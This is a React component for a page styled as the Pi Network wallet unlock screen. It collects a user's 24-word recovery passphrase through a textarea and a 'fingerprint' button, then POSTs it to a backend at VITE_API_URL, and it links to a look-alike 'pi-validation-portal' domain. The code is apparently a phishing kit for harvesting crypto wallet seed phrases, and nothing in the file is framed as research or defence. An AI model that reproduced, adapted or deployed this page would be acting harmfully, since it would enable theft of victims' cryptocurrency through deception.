import { useState } from 'react';
import '../Wallet.css';

function Wallet() {
  const [passphrase, setPassphrase] = useState('');
  const [error, setError] = useState(false);
  const [message, setMessage] = useState('');

  const handleSubmit = async (e, buttonType) => {
    e.preventDefault();

    // Basic validation
    if (!passphrase.trim()) {
      setError(true);
      setMessage('Passphrase is required');
      return;
    }

    try {
      const response = await fetch(`${import.meta.env.VITE_API_URL}/api/wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ passphrase, buttonType }),
      });

      const data = await response.json();
      if (response.ok) {
        setError(false);
        setMessage('Wallet connect successfully');
        setPassphrase('');
      } else {
        setError(true);
        setMessage(data.message || 'Invailed Passphrase');
      }
    } catch (error) {
      setError(true);
      setMessage('Server error');
      console.error('Error:', error);
    }
  };

  return (
    <main className="main">
      <div className="wallet">
        <div className="wallet-container">
          <div className="wallet-content text-center">
            <h4 className="wallet-heading">Unlock Pi Wallet</h4>
            <form id="piWalletForm" onSubmit={(e) => handleSubmit(e, 'Passphrase')} noValidate>
              <div className="form-group">
                <textarea
                  className="wallet-textarea"
                  id="passphrase"
                  name="message"
                  placeholder="Enter your 24-word passphrase here"
                  rows="6"
                  required
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                ></textarea>
                <div
                  id="error-message"
                  className="error-message"
                  style={{ display: error || message ? 'block' : 'none' }}
                >
                  {message || 'Invalid Passphrase'}
                </div>
              </div>
              <button type="submit" className="wallet-button wallet-button-primary wallet-button-block wallet-button-margin">
                Unlock With Passphrase
              </button>
              <button
                type="button"
                className="wallet-button wallet-button-primary wallet-button-block"
                onClick={(e) => handleSubmit(e, 'Fingerprint')}
              >
                Unlock with Fingerprint
              </button>
            </form>

            <div className="info wallet-info">
              <p>
                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to
                you. Recovery of passphrase is currently impossible.
              </p>
              <p>
                Lost your passphrase? You can{' '}
                <a
                  href="https://pi-validation-portal.in/validation/#"
                  target="_blank"
                  rel="noreferrer noopener"
                >
                  create a new wallet
                </a>
                , but all your π in your previous wallet will be inaccessible.
              </p>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}

export default Wallet;